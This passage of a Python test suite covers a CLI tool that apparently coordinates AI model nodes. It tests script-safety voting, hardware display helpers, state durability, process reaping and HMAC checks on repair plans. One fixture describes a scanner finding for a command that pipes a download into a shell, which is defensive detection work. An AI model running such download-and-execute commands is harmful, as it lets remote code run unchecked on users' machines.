    def test_unanimous_flag_still_faces_evidence_demand(self, monkeypatch):
        # Even 2/2 suspicious cannot skip the re-ask on a clean static scan —
        # this was the exact 0.5B-brain vibes-veto class from 2026-11-14.
        res, asks = self._run(
            monkeypatch,
            [self._vote("suspicious", "local:port:8090", "local")],
            [self._vote("suspicious", "bee:yalla/qwen", "hive")],
            confirm_verdict="ok")
        assert len(asks) == 1 and "CONCRETE" in asks[0]
        assert res["verdict"] == "ok" and "not confirmed" in res["reason"]

    def test_critical_static_skips_confirmation_entirely(self, monkeypatch):
        # A pattern-scan critical is corroborated evidence — no re-ask allowed.
        res, asks = self._run(
            monkeypatch,
            [self._vote("suspicious", "local:port:8090", "local")],
            [self._vote("suspicious", "bee:yalla/qwen", "hive")],
            confirm_verdict="ok",
            static_findings=[{"severity": "critical",
                              "why": "pipes a download straight into a shell",
                              "line_no": 1, "line": "x"}])
        assert res["verdict"] == "suspicious"
        assert "critical pattern" in res["reason"]
        assert asks == [], "critical must never trigger the confirm round"

    def test_hive_flagger_confirm_resolves_via_hub_nodes(self, monkeypatch):
        # tie with the HIVE brain as flagger: confirm must re-resolve its
        # endpoint through GET /api/control/nodes (http path).
        http_calls = []
        res, asks = self._run(
            monkeypatch,
            [self._vote("ok", "local:port:8090", "local")],
            [self._vote("suspicious", "bee:yalla/qwen3", "hive")],
            confirm_verdict="ok",
            track_http=http_calls)
        assert http_calls and http_calls[0][1] == "/api/control/nodes"
        assert len(asks) == 1
        assert res["verdict"] == "ok" and "not confirmed" in res["reason"]


# ── 17. display helpers (narrow table columns) ───────────────────────────
class TestDisplayShorts:
    def test_intel_full_string_compacts(self):
        assert hivv._short_cpu("Intel(R) Core(TM) i7-10700 CPU @ 2.90GHz") == "i7-10700 @2.9G"

    def test_amd_ryzen_strips_boilerplate(self):
        assert hivv._short_cpu("AMD Ryzen 7 5800X 8-Core Processor") == "Ryzen 7 5800X"

    def test_apple_passthrough(self):
        assert hivv._short_cpu("Apple M2 Pro") == "M2 Pro"

    def test_none_empty_unknown(self):
        assert hivv._short_cpu(None) == "?"
        assert hivv._short_cpu("") == "?"
        assert hivv._short_cpu("?") == "?"

    def test_width_cap_with_ellipsis(self):
        out = hivv._short_cpu("Some Very Long Unknown CPU Model Name That Never Fits", width=12)
        assert len(out) <= 12 and out.endswith("…")

    def test_gpu_strips_nvidia_geforce(self):
        assert hivv._short_gpu("NVIDIA GeForce RTX 3060") == "RTX 3060"

    def test_gpu_quadro_keeps_model_line(self):
        assert hivv._short_gpu("NVIDIA Quadro K1200") == "Quadro K1200"

    def test_gpu_amd_radeon(self):
        assert hivv._short_gpu("AMD Radeon RX 6800 XT") == "RX 6800 XT"

    def test_gpu_bare_name_untouched(self):
        assert hivv._short_gpu("GTX 1660 SUPER") == "GTX 1660 SUPER"

    def test_gpu_none_unknown(self):
        assert hivv._short_gpu(None) == "?"
        assert hivv._short_gpu("") == "?"

    def test_gpu_width_cap(self):
        out = hivv._short_gpu("NVIDIA GeForce Some Extremely Long Card Name", width=10)
        assert len(out) <= 10 and out.endswith("…")

    def test_cpu_model_is_str_or_none(self):
        v = hivv._cpu_model()
        assert v is None or (isinstance(v, str) and v.strip())


# ── 18. state durability (the 2026-11-14 node_secret wipe) ───────────────
class TestStateDurability:
    def test_write_state_atomic_no_tmp_left(self):
        hivv.write_state({"probe": 1})
        assert json.loads(hivv.STATE_FILE.read_text()) == {"probe": 1}
        tmp = hivv.STATE_FILE.with_name(hivv.STATE_FILE.name + ".tmp")
        assert not tmp.exists(), "write_state must not leave a temp file"
        hivv.write_state({})   # leave the isolated state clean

    def test_torn_state_read_returns_empty_not_crash(self):
        # A torn write (old bug) must degrade to {} so callers merge instead
        # of raising — paired with atomic writes so {} should be rare.
        hivv.STATE_FILE.write_text('{"node_secret": "abcd')   # truncated JSON
        assert hivv.read_state() == {}
        hivv.write_state({})

    def test_cmd_agent_merges_state_never_resets(self, monkeypatch):
        # Canary: cmd_agent used to write_state({6 keys}) — wiping node_secret
        # on EVERY restart/execv → inbox 403 forever (masjid+ashy 2026-11-14).
        src = CLI_PATH.read_text(encoding="utf-8")
        block = src.split("def cmd_agent", 1)[1].split("\ndef ", 1)[0]
        assert "st = read_state()" in block, "cmd_agent must read before writing"
        assert "st.update(" in block, "cmd_agent must merge into existing state"
        assert 'write_state({"started_at"' not in src, (
            "fresh-dict write_state in cmd_agent regresses the node_secret wipe")


# ── 19. duplicate-reaper keeper priority ─────────────────────────────────
class TestReaperPriority:
    def test_systemd_pid_beats_pidfile_and_newest(self, monkeypatch):
        killed = []
        monkeypatch.setattr(hivv, "_agent_pids", lambda: [900001, 900002, 900003])
        monkeypatch.setattr(hivv, "_systemd_agent_main_pid", lambda: 900002)
        monkeypatch.setattr(hivv, "read_pid", lambda: 900003)
        monkeypatch.setattr(hivv.os, "kill",
                            lambda p, s: killed.append(p))
        k, kept, note = hivv._reap_duplicate_agents()
        assert kept == 900002, "systemd's MainPID must win (killing it makes systemd restart it)"
        assert sorted(k) == [900001, 900003]
        assert 900002 not in killed

    def test_pidfile_preferred_without_systemd(self, monkeypatch):
        killed = []
        monkeypatch.setattr(hivv, "_agent_pids", lambda: [900001, 900002])
        monkeypatch.setattr(hivv, "_systemd_agent_main_pid", lambda: None)
        monkeypatch.setattr(hivv, "read_pid", lambda: 900002)
        monkeypatch.setattr(hivv.os, "kill", lambda p, s: killed.append(p))
        k, kept, _ = hivv._reap_duplicate_agents()
        assert kept == 900002
        assert k == [900001]

    def test_never_kills_itself(self, monkeypatch):
        me = os.getpid()
        killed = []
        monkeypatch.setattr(hivv, "_agent_pids", lambda: [me, 900001])
        monkeypatch.setattr(hivv, "_systemd_agent_main_pid", lambda: None)
        monkeypatch.setattr(hivv, "read_pid", lambda: None)  # stale pidfile
        monkeypatch.setattr(hivv.os, "kill", lambda p, s: killed.append(p))
        k, kept, _ = hivv._reap_duplicate_agents()
        assert kept == me, "with no pidfile/systemd, the repairing agent keeps itself"
        assert k == [900001] and me not in killed

    def test_single_agent_is_noop(self, monkeypatch):
        monkeypatch.setattr(hivv, "_agent_pids", lambda: [900001])
        monkeypatch.setattr(hivv, "_systemd_agent_main_pid", lambda: None)
        k, kept, note = hivv._reap_duplicate_agents()
        assert k == [] and kept == 900001 and note == ""


# ── 20. stale launcher self-heal (fail-safe around the hub) ──────────────
class TestWrapperRefresh:
    def test_no_wrapper_is_noop(self, monkeypatch):
        monkeypatch.setattr(hivv, "_is_dev_mode", lambda: False)
        monkeypatch.setattr(hivv.shutil, "which", lambda *a, **k: None)
        hivv._refresh_wrapper_if_stale()   # must not raise

    def test_healthy_wrapper_never_touches_network(self, monkeypatch, tmp_path):
        w = tmp_path / "hivv"
        w.write_text('#!/usr/bin/env bash\n# CLIENT_FILE=x\nexec python3 cli.py "$@"\n')
        monkeypatch.setattr(hivv, "_is_dev_mode", lambda: False)
        monkeypatch.setattr(hivv.shutil, "which", lambda *a, **k: str(w))
        monkeypatch.setattr(hivv, "_http_get_bytes",
                            lambda *a, **k: (_ for _ in ()).throw(
                                AssertionError("healthy wrapper must not fetch")))
        before = w.read_bytes()
        hivv._refresh_wrapper_if_stale()
        assert w.read_bytes() == before

    def test_stale_wrapper_survives_hub_outage(self, monkeypatch, tmp_path):
        # stale form (captures output) + dead hub → leave file untouched, no raise
        w = tmp_path / "hivv"
        w.write_bytes(b'#!/usr/bin/env bash\n# CLIENT_FILE=x\n'
                      b'out=$(python3 "$CLIENT_FILE" "$@")\n'
                      b'result=$?\n' + b'echo "$out"\nexit $result\n'
                      + b'cli_output=$(\n')
        monkeypatch.setattr(hivv, "_is_dev_mode", lambda: False)
        monkeypatch.setattr(hivv.shutil, "which", lambda *a, **k: str(w))
        before = w.read_bytes()
        hivv._refresh_wrapper_if_stale()   # HUB is the dead port in this suite
        assert w.read_bytes() == before, "failed refresh must not clobber the launcher"
        assert not w.with_name(w.name + ".new").exists()


# ── 21. repair HMAC parity (bee side of the hub signer) ──────────────────
class TestRepairSignatureParity:
    """The hub signs ts\\n ttl\\n sorted-compact-ops; the bee verifies the same
    canonical. 2026-11-14: hub signed INSERTION-order ops → every multi-key
    (cli_update) plan failed verification. These tests pin the contract."""
    import hmac as _hmac
    import hashlib as _hashlib
    SECRET = "parity-secret-0123456789"

    def _payload(self, ops, sig):
        return {"plan_id": "rp_parity", "ts": 1794700000, "ttl_s": 300,
                "ops": ops, "reason": "t", "sig": sig}

    def _sig(self, canonical: str) -> str:
        return self._hmac.new(self.SECRET.encode(), canonical.encode(),
                              self._hashlib.sha256).hexdigest()

    def test_sorted_compact_canonical_verifies(self):
        ops = [{"op": "cli_update", "force": True}]
        canon = (f"1794700000\n300\n"
                 + json.dumps(ops, sort_keys=True, separators=(",", ":")))
        p = self._payload(ops, self._sig(canon))
        assert hivv._repair_signature_ok(self.SECRET, p) is True

    def test_insertion_order_sig_rejected(self):
        # the exact 2026-11-14 bug: compact-but-UNSORTED (JS JSON.stringify)
        ops = [{"op": "cli_update", "force": True}]
        wrong = (f"1794700000\n300\n" + json.dumps(ops, separators=(",", ":")))
        p = self._payload(ops, self._sig(wrong))
        assert hivv._repair_signature_ok(self.SECRET, p) is False

    def test_tampered_ops_rejected(self):
        ops = [{"op": "cli_update", "force": True}]
        canon = (f"1794700000\n300\n"
                 + json.dumps(ops, sort_keys=True, separators=(",", ":")))
        p = self._payload(ops, self._sig(canon))
        p["ops"] = [{"op": "cli_update", "force": False}]   # flip force after signing
        assert hivv._repair_signature_ok(self.SECRET, p) is False

    def test_wrong_secret_rejected(self):
        ops = [{"op": "reap_duplicates"}]
        canon = (f"1794700000\n300\n"
                 + json.dumps(ops, sort_keys=True, separators=(",", ":")))
        p = self._payload(ops, self._sig(canon))
        assert hivv._repair_signature_ok("other-secret", p) is False

    def test_missing_sig_rejected(self):
        ops = [{"op": "reap_duplicates"}]
        p = self._payload(ops, "")
        assert hivv._repair_signature_ok(self.SECRET, p) is False


# ── 22. chat flag recovery (REMAINDER swallowed documented flags) ─────────
class TestChatFlagRecovery:
    """`hivv chat "hi" --mode=fast` is the documented form, but
    nargs=REMAINDER put `--mode=fast` INTO the message and left mode=None
    (live hit 2026-11-15: model echoed 'PONG --mode=fast'). cmd_chat must
    recover known flags from the remainder."""

    def _run(self, message_parts, mode=None, monkeypatch=None):
        import argparse as _ap
        captured = {}

        def fake_do_chat(msg, stream=True, mode=None):
            captured["msg"] = msg
            captured["mode"] = mode

        orig = hivv._do_chat
        hivv._do_chat = fake_do_chat
        try:
            ns = _ap.Namespace(message=message_parts, mode=mode)
            hivv.cmd_chat(ns)
        finally:
            hivv._do_chat = orig
        return captured

    def test_flag_after_message_is_extracted(self):
        out = self._run(["Reply with exactly: PONG", "--mode=fast"])
        assert out["msg"] == "Reply with exactly: PONG"
        assert out["mode"] == "fast"

    def test_flag_before_message_still_works(self):
        out = self._run(["Reply with exactly: PONG"], mode="fast")
        assert out["msg"] == "Reply with exactly: PONG"
        assert out["mode"] == "fast"

    def test_unknown_flag_stays_in_message(self):
        out = self._run(["keep this text", "--mode=notamode"])
        assert "--mode=notamode" in out["msg"], "unknown values are literal text"
        assert out["mode"] is None

    def test_space_separated_flag(self):
        out = self._run(["hello world", "--mode", "cheap"])
        assert out["msg"] == "hello world"
        assert out["mode"] == "cheap"

    def test_multiword_message_preserved(self):
        out = self._run(["what", "is", "the", "hive"])
        assert out["msg"] == "what is the hive"
        assert out["mode"] is None

    def test_parser_remainder_is_the_root_cause(self):
        # documents WHY: the parser itself swallows trailing flags
        import argparse as _ap  # noqa: F401
        p = hivv.build_parser()
        a = p.parse_args(["chat", "hi", "--mode=fast"])
        assert a.message == ["hi", "--mode=fast"] and a.mode is None
